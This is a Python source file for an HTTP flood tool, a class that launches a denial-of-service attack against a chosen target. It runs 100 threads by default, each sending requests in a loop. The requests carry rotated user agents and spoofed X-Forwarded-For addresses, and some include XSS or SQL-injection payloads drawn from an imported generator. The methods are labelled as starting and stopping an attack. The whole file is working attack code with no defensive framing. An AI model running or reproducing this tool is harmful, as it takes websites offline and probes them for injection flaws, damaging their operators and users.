import threading
import random
import requests
from . import payload_generator


class HTTPFlood:
    def __init__(self, target, method='GET', protocol='https',
                 endpoint='/', payload_type='domain', num_threads=100,
                 user_agents_file='user-agents.txt'):
        self.target = target
        self.method = method.upper()
        self.protocol = protocol
        self.endpoint = endpoint
        self.payload_type = payload_type
        self.num_threads = num_threads
        self.user_agents = self.load_user_agents(user_agents_file)
        self.is_running = False
        self.threads = []

    def load_user_agents(self, file_path):
        """Load user agents from file"""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

    def generate_headers(self):
        """Generate random headers for each request"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'
        }

        # Add dynamic headers
        headers['User-Agent'] = random.choice(self.user_agents)
        headers[
            'X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        headers['Referer'] = f"{self.protocol}://{self.target}{self.endpoint}"

        return headers

    def generate_payload(self):
        """Generate payload based on type"""
        if self.payload_type == 'domain':
            return {'domain': payload_generator.generate_random_payload('domain')}
        elif self.payload_type == 'search':
            return {'namekey': payload_generator.generate_random_payload('search')}
        elif self.payload_type == 'xss':
            return {'namekey': payload_generator.generate_random_payload('xss')}
        elif self.payload_type == 'sqli':
            return {'namekey': payload_generator.generate_random_payload('sqli')}
        return {}

    def send_request(self):
        """Send HTTP request"""
        url = f"{self.protocol}://{self.target}{self.endpoint}"
        headers = self.generate_headers()
        payload = self.generate_payload()

        try:
            if self.method == 'GET':
                requests.get(url, params=payload, headers=headers, timeout=5)
            elif self.method == 'POST':
                requests.post(url, data=payload, headers=headers, timeout=5)
        except Exception:
            pass

    def worker(self):
        """Worker thread for sending requests"""
        while self.is_running:
            self.send_request()

    def start(self):
        """Start attack"""
        self.is_running = True
        self.threads = []

        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def stop(self):
        """Stop attack"""
        self.is_running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1)